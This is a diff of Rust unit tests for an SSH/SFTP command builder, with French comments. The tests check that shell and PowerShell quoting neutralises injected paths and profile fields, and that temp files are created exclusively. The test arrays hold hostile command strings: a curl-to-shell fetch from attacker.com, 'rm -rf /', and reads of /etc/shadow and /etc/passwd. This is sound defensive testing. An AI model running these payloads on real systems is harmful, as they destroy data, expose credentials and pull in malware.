@@ -749,4 +749,157 @@ mod tests {
         let cmd = format_powershell_command_line(&args);
         assert_eq!(cmd, "& ssh @('-p', '22', 'user@target')");
     }
+
+    // -----------------------------------------------------------------------
+    // Tests de Sécurité Avancés (Injection, Fuzzing, Vulnérabilités Shell/OS)
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn test_security_adversarial_remote_paths_injection() {
+        let prof = create_dummy_profile(
+            "sec1",
+            "sftp",
+            Some("server.corp"),
+            Some(22),
+            Some("secops"),
+            None,
+        );
+
+        let attack_payloads = [
+            // Command substitution
+            "/var/log/`touch /tmp/pwned`",
+            "/var/log/`id`",
+            "/var/log/$(reboot)",
+            "/var/log/$(curl -s http://attacker.com/malware | sh)",
+            // Chained commands and operators
+            "/var/log; rm -rf /",
+            "/var/log && rm -rf ~",
+            "/var/log || echo pwned",
+            "/var/log | cat /etc/shadow",
+            "/var/log & ping -c 1 127.0.0.1 &",
+            // Redirections
+            "/var/log > /dev/null",
+            "/var/log < /etc/passwd",
+            "/var/log >> /tmp/append",
+            "/var/log 2>&1",
+            // Variables and parameter expansion
+            "/var/log/$HOME",
+            "/var/log/${PATH}",
+            "/var/log/$SHELL",
+            "/var/log/$$",
+            // Quotes, backslashes, metacharacters
+            "/var/log/'single'\"double\"",
+            "/var/log/test's folder/with spaces",
+            "/var/log/\\;\\&\\|\\`\\$",
+            // Newlines and carriage returns
+            "/var/log\nrm -rf /",
+            "/var/log\r\nreboot",
+        ];
+
+        for payload in attack_payloads {
+            let args = build_ssh_args(&prof, &[], Some(payload)).expect("Should build args safely");
+
+            // 1. Vérifier que chaque argument individuel est correctement POSIX-quoted
+            for arg in &args {
+                let q = posix_quote(arg);
+                assert!(q.starts_with('\''), "Must start with single quote");
+                assert!(q.ends_with('\''), "Must end with single quote");
+            }
+
+            // 2. Vérifier que la commande POSIX pour le script local ne contient aucun appel non échappé
+            let posix_cmd = format_posix_command_line(&args);
+            assert!(posix_cmd.starts_with("ssh "));
+
+            // 3. Vérifier que la commande PowerShell n'utilise pas de syntaxe interpolée
+            let ps_cmd = format_powershell_command_line(&args);
+            assert!(ps_cmd.starts_with("& ssh @("));
+            assert!(ps_cmd.ends_with(')'));
+        }
+    }
+
+    #[test]
+    fn test_security_adversarial_profile_fields() {
+        let malicious_profiles = [
+            create_dummy_profile(
+                "p_malicious_1",
+                "sftp",
+                Some("evil.com; rm -rf /"),
+                Some(22),
+                Some("user`whoami`"),
+                Some("/tmp/key; touch /tmp/hacked"),
+            ),
+            create_dummy_profile(
+                "p_malicious_2",
+                "sftp",
+                Some("$(reboot).corp"),
+                Some(2222),
+                Some("admin'$(calc)'"),
+                None,
+            ),
+        ];
+
+        for prof in &malicious_profiles {
+            let args = build_ssh_args(prof, &[], None).unwrap();
+            let posix_cmd = format_posix_command_line(&args);
+
+            // Aucun métacaractère ne doit être libre hors de guillemets stricts
+            assert!(!posix_cmd.contains("; rm -rf / "));
+            assert!(!posix_cmd.contains("`whoami` "));
+
+            let ps_cmd = format_powershell_command_line(&args);
+            // Vérifier que PowerShell traite l'ensemble comme tableau littéral d'arguments
+            assert!(ps_cmd.starts_with("& ssh @("));
+        }
+    }
+
+    #[test]
+    fn test_security_posix_quote_invariants() {
+        // Teste diverses chaînes complexes et vérifie que posix_quote produit un littéral strict
+        let test_cases = [
+            "",
+            "normal",
+            " ",
+            "   ",
+            "\"double quotes\"",
+            "'single quotes'",
+            "'''",
+            "$VAR ${VAR} $() `command`",
+            "\\n \\r \\t \\0",
+            "a'b\"c$d`e\\f;g&h|i<j>k",
+        ];
+
+        for case in test_cases {
+            let quoted = posix_quote(case);
+            assert!(quoted.starts_with('\''), "Must start with single quote");
+            assert!(quoted.ends_with('\''), "Must end with single quote");
+            // Dans une chaîne POSIX '...', aucune substitution de variable ou de commande n'est possible
+        }
+    }
+
+    #[test]
+    fn test_security_macos_temp_script_exclusive_creation() {
+        // Vérifie que create_new(true) échoue si un fichier préexiste (protection contre symlink race)
+        let temp_dir = std::env::temp_dir();
+        let test_file = temp_dir.join(format!("orbit-sec-test-{}.tmp", std::process::id()));
+
+        // Créer le fichier
+        std::fs::write(&test_file, b"initial").unwrap();
+
+        // Tenter d'ouvrir avec create_new(true)
+        let result = std::fs::OpenOptions::new()
+            .write(true)
+            .create_new(true)
+            .open(&test_file);
+
+        // Doit échouer avec AlreadyExists
+        assert!(
+            result.is_err(),
+            "create_new must fail if file already exists"
+        );
+        let err = result.unwrap_err();
+        assert_eq!(err.kind(), std::io::ErrorKind::AlreadyExists);
+
+        // Nettoyage
+        let _ = std::fs::remove_file(test_file);
+    }
 }
